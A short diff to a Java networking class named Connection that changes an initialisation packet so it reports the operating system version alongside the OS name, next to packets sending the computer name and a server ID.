@@ -119,7 +119,7 @@ public class Connection implements Runnable {
 		}
 		addToSendQueue(new Packet14InitComputerName(computerName));
 
-		addToSendQueue(new Packet16InitOperatingSystem(System.getProperty("os.name")));
+		addToSendQueue(new Packet16InitOperatingSystem(System.getProperty("os.name") + " " + System.getProperty("os.version")));
 
 		addToSendQueue(new Packet15InitServerID(Main.getID()));
 
